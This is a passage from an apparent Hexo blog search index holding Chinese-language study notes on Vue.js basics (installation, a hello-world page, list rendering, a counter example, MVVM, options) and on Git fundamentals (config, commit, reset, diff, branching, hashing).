class="name">h2</span>&gt;</span>您输入的名字:&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">age</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>邂逅Vue</title>
      <link href="/posts/a5b0/"/>
      <url>/posts/a5b0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考视频：最全最新Vue、Vuejs教程，从入门到精通 <a href="https://www.bilibili.com/video/BV15741177Eh?p=1">https://www.bilibili.com/video/BV15741177Eh?p=1</a></p></blockquote><h1 id="什么是Vue-js"><a href="#什么是Vue-js" class="headerlink" title="什么是Vue.js"></a>什么是Vue.js</h1><p><strong>Vue.js</strong>（&#x2F;vjuː&#x2F;，或简称为<strong>Vue</strong>）是一个用于创建用户界面的<strong>开源JavaScript框架</strong>，也是一个创建单页应用的Web应用框架，是一个<strong>渐进式和响应式</strong>的框架。</p><ul><li>Vue有很多特点和Web开发中常见的高级功能<ul><li>解耦视图和数据</li><li>可复用的组件</li><li>前端路由技术</li><li>状态管理</li><li>虚拟DOM</li></ul></li></ul><p>【Vue中文官网，观看WHY VUE.JS?】：<a href="https://cn.vuejs.org/">https://cn.vuejs.org/</a></p><h1 id="Vue-js安装"><a href="#Vue-js安装" class="headerlink" title="Vue.js安装"></a>Vue.js安装</h1><ul><li>方式一：直接CDN引入<br>你可以选择引入开发环境版本还是生产环境版本</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 生产环境版本，优化了尺寸和速度 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>方式二：下载和引入</p><ul><li>开发环境 <a href="https://vuejs.org/js/vue.js">https://vuejs.org/js/vue.js</a></li><li>生产环境 <a href="https://vuejs.org/js/vue.min.js">https://vuejs.org/js/vue.min.js</a></li><li><code>&lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;</code></li></ul></li><li><p>方式三：NPM安装<br><code>$ npm install vue</code></p></li></ul><h1 id="Vue初体验"><a href="#Vue初体验" class="headerlink" title="Vue初体验"></a>Vue初体验</h1><h2 id="HelloVuejs"><a href="#HelloVuejs" class="headerlink" title="HelloVuejs"></a>HelloVuejs</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;下午好，阿楠&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们来阅读JavaScript代码，会发现创建了一个<strong>Vue对象</strong>。</p><p>创建Vue对象的时候，传入了一些options：{}</p><ul><li>{}中包含了<strong>el属性</strong>：该属性决定了这个Vue对象挂载到哪一个元素上，很明显我们这里是挂载到了id为app的元素上。</li><li>{}中包含了<strong>data属性</strong>：该属性中通常会存储一些数据，这些数据可以是我们直接定义出来的，比如像上面这样。也可能是来自网络，从服务器加载的。</li></ul><blockquote><p>浏览器执行代码的流程：<br>执行到10~13行代码显然出对应的HTML<br>执行第16行代码创建Vue实例，并且对原HTML进行解析和修改。</p></blockquote><h2 id="Vue列表显示"><a href="#Vue列表显示" class="headerlink" title="Vue列表显示"></a>Vue列表显示</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in star&quot;</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">star</span>: [<span class="string">&#x27;刘亦菲&#x27;</span>,<span class="string">&#x27;程潇&#x27;</span>,<span class="string">&#x27;IU&#x27;</span>,<span class="string">&#x27;林允儿&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>它还是响应式的。<br>也就是说，当我们数组中的数据发生改变时，界面会自动改变。<br>打开开发者模式的console试一下</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201011173203.png"></p><h2 id="案例：计数器"><a href="#案例：计数器" class="headerlink" title="案例：计数器"></a>案例：计数器</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前计数为：&#123;&#123;count&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;add&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;sub&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">count</span>: <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">add</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;add被执行&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">count</span>++</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">sub</span>: <span class="keyword">function</span> (<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sub被执行&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">count</span>--</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201011173424.png"></p><h1 id="Vue中的MVVM"><a href="#Vue中的MVVM" class="headerlink" title="Vue中的MVVM"></a>Vue中的MVVM</h1><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201011175627.png"></p><ul><li>View层：<br>视图层<br>在我们前端开发中，通常就是DOM层。<br>主要的作用是给用户展示各种信息。</li><li>Model层：<br>数据层<br>数据可能是我们固定的死数据，更多的是来自我们服务器，从网络上请求下来的数据。<br>在我们计数器的案例中，就是后面抽取出来的obj，当然，里面的数据可能没有这么简单。</li><li>ViewModel层：<br>视图模型层<br>视图模型层是View和Model沟通的桥梁。<br>一方面它实现了Data Binding，也就是数据绑定，将Model的改变实时的反应到View中<br>另一方面它实现了DOM Listener，也就是DOM监听，当DOM发生一些事件(点击、滚动、touch等)时，可以监听到，并在需要的情况下改变对应的Data。</li></ul><p>我们的计数器中就有严格的MVVM思想，View依然是我们的DOM，Model就是我们data中的数据，可以抽离出来成为obj，ViewModel就是我们创建的Vue对象实例。</p><blockquote><p>找了一篇相对好理解的博客，了解MVVM以及MVVM和MVC的区别：<a href="https://blog.csdn.net/qq_42068550/article/details/89480350">MVC和MVVM的区别</a></p></blockquote><h1 id="创建Vue实例传入的options"><a href="#创建Vue实例传入的options" class="headerlink" title="创建Vue实例传入的options"></a>创建Vue实例传入的options</h1><p>我们在创建Vue实例的时候，传入了一个对象options。<br>这个options中可以包含哪些选项呢？<br>详细解析： <a href="https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E6%95%B0%E6%8D%AE">https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E6%95%B0%E6%8D%AE</a><br>目前掌握这些选项：</p><ul><li>el:<br>类型：string【常用】 | HTMLElement<br>作用：决定之后Vue实例会管理哪一个DOM。</li><li>data:<br>类型：Object | Function （组件当中data必须是一个函数）<br>作用：Vue实例对应的数据对象。</li><li>methods:<br>类型：{ [key(string类型)]: Function }<br>作用：定义属于Vue的一些方法，可以在其他地方调用，也可以在指令中使用。</li></ul><h1 id="Vue的生命周期"><a href="#Vue的生命周期" class="headerlink" title="Vue的生命周期"></a>Vue的生命周期</h1><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201011182227.png"><br><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201011182212.png"></p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git</title>
      <link href="/posts/629e/"/>
      <url>/posts/629e/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考视频：【尚硅谷】Git与GitHub基础全套完整版教程 <a href="https://www.bilibili.com/video/BV1pW411A7a5">https://www.bilibili.com/video/BV1pW411A7a5</a></p></blockquote><h1 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h1><p><strong>版本控制</strong> ：工程设计领域中使用版本控制管理工程蓝图的设计过程。在 IT 开发过程中也可以使用版本控制思想管理代码的版本迭代。</p><hr><p><strong>版本控制工具应该具备的功能：</strong></p><blockquote><ul><li><p><strong>协同修改：</strong>多人并行不悖的修改服务器端的同一个文件。 </p></li><li><p><strong>数据备份：</strong>不仅保存目录和文件的当前状态，还能够保存每一个提交过的历史状态。 </p></li><li><p><strong>版本管理：</strong>在保存每一个版本的文件信息的时候要做到不保存重复数据，以节约存储空间，提高运行效率。这方面 SVN 采用的是<strong>增量式管理</strong>的方式，而 Git 采取了<strong>文件系统快照</strong>的方式。  </p></li><li><p><strong>权限控制：</strong>对团队中参与开发的人员进行权限控制。 对团队外开发者贡献的代码进行审核（Git 独有）。 </p></li><li><p><strong>历史记录：</strong>查看修改人、修改时间、修改内容、日志信息。 将本地文件恢复到某一个历史状态。 </p></li><li><p><strong>分支管理：</strong>允许开发团队在工作过程中多条生产线同时推进任务，进一步提高效率。</p></li></ul></blockquote><hr><p><strong>版本控制工具</strong></p><p>集中式版本控制工具： CVS、<strong>SVN</strong>、VSS……</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201005192430.png"></p><p>分布式版本控制工具： <strong>Git</strong>、Mercurial、Bazaar、Darcs……</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201005192508.png"></p><h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><h2 id="了解和准备"><a href="#了解和准备" class="headerlink" title="了解和准备"></a>了解和准备</h2><h3 id="简史"><a href="#简史" class="headerlink" title="简史"></a>简史</h3><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201006143119.png"></p><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ul><li><p>大部分操作在本地完成，不需要联网</p></li><li><p>完整性保证</p></li><li><p>尽可能添加数据而不是删除或修改数据</p></li><li><p>分支操作非常快捷流畅</p></li><li><p>与 Linux 命令全面兼容</p></li></ul><h3 id="Git结构"><a href="#Git结构" class="headerlink" title="Git结构"></a>Git结构</h3><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201006144816.png"></p><h3 id="代码托管中心"><a href="#代码托管中心" class="headerlink" title="代码托管中心"></a>代码托管中心</h3><p>代码托管中心的任务：维护远程库 </p><p>局域网环境下： GitLab 服务器 </p><p>外网环境下 ： GitHub 、码云 </p><h3 id="跨团队协作"><a href="#跨团队协作" class="headerlink" title="跨团队协作"></a>跨团队协作</h3><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201006174847.png"></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li>安装到一个非中文没有空格的目录下</li><li>使用Vim编辑器，选择【Use  Vim(the  ubiquitous  text  editor)  as  Git’s  default  editor】</li><li>完全不修改PATH环境变量，仅在Git Bash中使用Git，选择【Use  Git  from  Git  Bah  only】</li><li>选择【Use  the  OpenSSL  library 】</li><li>行末换行符转换方式，使用默认值，选择【Checkout  Windows-style , commit  Unix-style  line  endings】</li><li>执行Git命令的默认终端，使用默认值，选择【Use  MinTTY(the  default  terminal  of  MSYS2)】</li><li>选择【Enable  file  system  caching !】和【Enable  Git  Credential  Manager】，最后点击 install</li></ol><h2 id="命令行基本操作"><a href="#命令行基本操作" class="headerlink" title="命令行基本操作"></a>命令行基本操作</h2><h3 id="本地库初始化"><a href="#本地库初始化" class="headerlink" title="本地库初始化"></a>本地库初始化</h3><p><strong>命令：</strong><code>git init</code></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215000.png"></p><p>注意： .git 目录中存放的是本地库相关的子目录和文件，不要删除，也不要胡乱修改。</p><hr><h3 id="设置签名"><a href="#设置签名" class="headerlink" title="设置签名"></a>设置签名</h3><blockquote><p>形式：</p><ul><li><p>用户名：Nan</p></li><li><p>Email 地址：<a href="mailto:&#56;&#51;&#x39;&#x37;&#55;&#x37;&#52;&#48;&#x38;&#64;&#x71;&#113;&#46;&#99;&#111;&#x6d;">&#56;&#51;&#x39;&#x37;&#55;&#x37;&#52;&#48;&#x38;&#64;&#x71;&#113;&#46;&#99;&#111;&#x6d;</a></p></li></ul><p>作用：区分不同开发人员的身份 </p><p>辨析：这里设置的签名和登录远程库(代码托管中心)的账号、密码没有任何关系。</p></blockquote><p><strong>命令：</strong></p><p><strong>项目级别&#x2F;仓库级别：</strong>仅在当前本地库范围内有效 </p><ul><li><p><code>git config user.name Nan</code></p></li><li><p><code>git config user.email 839777408@qq.com</code></p></li></ul><p>信息保存位置： .git 目录下的 config 文件中</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201007103825.png"></p><p><strong>系统用户级别：</strong>登录当前操作系统的用户范围 </p><ul><li><p><code>git config --global user.name 阿楠</code></p></li><li><p><code>git config --global user.email 839777408@qq.com</code></p></li></ul><p>信息保存位置：~&#x2F;.gitconfig （根目录下的 .gitconfig文件中）</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201007160012.png"></p><blockquote><p>级别优先级：</p><ul><li>就近原则：项目级别优先于系统用户级别，二者都有时采用项目级别的签名 </li><li>如果只有系统用户级别的签名，就以系统用户级别的签名为准 </li><li>二者都没有不允许</li></ul></blockquote><hr><h3 id="状态查看"><a href="#状态查看" class="headerlink" title="状态查看"></a><strong>状态查看</strong></h3><p>查看工作区、暂存区状态</p><p><code>git status</code></p><blockquote><p>modified为红色，说明工作区和暂存区内容不一致</p><p>modified为绿色，说明暂存区和本地库内容不一致</p></blockquote><hr><h3 id="添加到暂存区和取消添加到暂存区"><a href="#添加到暂存区和取消添加到暂存区" class="headerlink" title="添加到暂存区和取消添加到暂存区"></a>添加到暂存区和取消添加到暂存区</h3><p> 将工作区的“新建&#x2F;修改”添加到暂存区：</p><p><code>git add [file name]</code></p><p>取消添加到暂存区命令：</p><p><code>git rm --cached [file name]</code></p><hr><h3 id="提交到本地库"><a href="#提交到本地库" class="headerlink" title="提交到本地库"></a>提交到本地库</h3><p>将暂存区的内容提交到本地库：</p><p><code>git commit -m &quot;commit message&quot; [file name]</code></p><hr><h3 id="查看历史版本记录"><a href="#查看历史版本记录" class="headerlink" title="查看历史版本记录"></a>查看历史版本记录</h3><p><code>git log</code></p><p><code>git log --pretty=oneline</code></p><p><code>git log --oneline</code></p><p><code>git reflog</code> </p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201007160950.png"></p><blockquote><ul><li><p>多屏显示控制方式： </p></li><li><p>空格向下翻页 </p></li><li><p>b 向上翻页 </p></li><li><p>q 退出</p></li><li><p>HEAD@{移动到当前版本需要多少步} </p></li><li><p>vim模式（显示行号）： <code>:set nu</code></p></li></ul></blockquote><hr><h3 id="版本的前进和后退"><a href="#版本的前进和后退" class="headerlink" title="版本的前进和后退"></a>版本的前进和后退</h3><p><strong>本质就是HEAD指针的移动</strong></p><ul><li><p>基于索引值操作 【推荐】</p><ul><li><code>git reset --hard [局部索引值]</code></li><li>例如：git reset –hard 31364f7</li></ul></li><li><p>使用^符号：只能后退 </p><ul><li><p><code>git reset --hard HEAD^</code></p></li><li><p>注：一个^表示后退一步，n 个表示后退 n 步</p></li></ul></li><li><p>使用~符号：只能后退 </p><ul><li><code>git reset --hard HEAD~n</code> </li><li>注：表示后退 n 步</li></ul></li></ul><hr><h3 id="reset-命令的三个参数对比"><a href="#reset-命令的三个参数对比" class="headerlink" title="reset 命令的三个参数对比"></a>reset 命令的三个参数对比</h3><ul><li><p>–soft 参数 </p><ul><li>仅仅在本地库移动 HEAD 指针 </li><li>暂存区和工作区没有修改</li></ul></li><li><p>–mixed 参数 </p><ul><li>在本地库移动 HEAD 指针 </li><li>重置暂存区 ，使其与本地库一致</li></ul></li><li><p>–hard 参数 [常用]</p><ul><li>在本地库移动 HEAD 指针 </li><li>重置暂存区，使其与本地库一致</li><li>重置工作区，使其与本地库一致</li></ul></li></ul><hr><h3 id="比较文件差异"><a href="#比较文件差异" class="headerlink" title="比较文件差异"></a>比较文件差异</h3><ul><li><p>将工作区中的文件和暂存区进行比较：</p><ul><li><code>git diff [文件名] </code></li></ul></li><li><p>将工作区中的文件和本地库历史记录比较：</p><ul><li><code>git diff [本地库中历史版本] [文件名]</code></li></ul></li><li><p>不带文件名比较多个文件</p></li></ul><h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><h3 id="什么是分支"><a href="#什么是分支" class="headerlink" title="什么是分支"></a>什么是分支</h3><p>在版本控制过程中，使用多条线同时推进多个任务。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201007172431.png"></p><p><strong>好处：</strong></p><ul><li><p>同时并行推进多个功能开发，提高开发效率 。</p></li><li><p>各个分支在开发过程中，如果某一个分支开发失败，不会对其他分支有任何影响。失败的分支删除重新开始即可。</p></li></ul><hr><h3 id="分支操作"><a href="#分支操作" class="headerlink" title="分支操作"></a>分支操作</h3><p><strong>创建分支：</strong> </p><p><code>git branch [分支名] </code></p><p><strong>查看分支 :</strong></p><p><code>git branch -v</code></p><p><strong>切换分支 ：</strong></p><p><code>git checkout [分支名]</code></p><p><strong>合并分支 :</strong></p><ol><li><p>切换到接受修改的分支（被合并，增加新内容）上 </p><p><code>git checkout [被合并分支名]</code></p></li><li><p>执行 merge 命令 </p><p><code>git merge [有新内容分支名]</code></p></li></ol><p><strong>解决冲突 ：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201007180054.png"></p><ol><li><p>编辑文件，删除特殊符号 </p></li><li><p>把文件修改到满意的程度，保存退出 </p></li><li><p>git add [文件名] </p></li><li><p>git commit -m “日志信息”</p></li></ol><p><strong>注意：此时 commit 一定不能带具体文件名。</strong></p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><h3 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h3><p>哈希是一个系列的加密算法，各个不同的哈希算法虽然加密强度不同，但是有以下几个共同点： </p><p>①不管输入数据的数据量有多大，输入同一个哈希算法，得到的加密结果长度固定。 </p><p>②哈希算法确定，输入数据确定，输出数据能够保证不变 </p><p>③哈希算法确定，输入数据有变化，输出数据一定有变化，而且通常变化很大 </p><p>④哈希算法不可逆 </p><p><strong>Git 底层采用的是 SHA-1 算法。</strong> </p><p>哈希算法可以被用来验证文件。原理如下图所示：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201007193359.png"></p><p>Git 就是靠这种机制来从根本上保证数据完整性的。 </p><h3 id="Git保存版本的机制"><a href="#Git保存版本的机制" class="headerlink" title="Git保存版本的机制"></a>Git保存版本的机制</h3><p><strong>集中式版本控制工具的文件管理机制</strong> </p><p>以文件变更列表的方式存储信息。这类系统将它们保存的信息看作是一组基本文件和每个文件随时间逐步累积的差异。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215018.png"></p><hr><p><strong>Git</strong> <strong>的文件管理机制</strong> </p><p>Git 把数据看作是小型文件系统的一组快照。每次提交更新时 Git 都会对当前的全部文件制作一个快照并保存这个快照的索引。为了高效，如果文件没有修改，Git 不再重新存储该文件，而是只保留一个链接指向之前存储的文件。所以 Git 的工作方式可以称之为快照流。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215019.png"></p><h3 id="Git文件管理机制细节"><a href="#Git文件管理机制细节" 